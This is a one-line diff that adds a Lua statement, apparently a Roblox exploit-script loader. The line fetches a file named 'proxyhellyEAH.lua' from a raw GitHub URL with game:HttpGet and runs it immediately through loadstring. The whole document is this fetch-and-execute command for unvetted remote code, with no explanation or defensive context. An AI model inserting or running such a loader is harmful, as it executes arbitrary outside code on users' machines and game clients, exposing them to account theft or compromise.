@@ -1,0 +1,1 @@
+loadstring(game:HttpGet([[https://raw.githubusercontent.com/YingXiangLing/1.0/refs/heads/main/proxyhellyEAH.lua]]))()
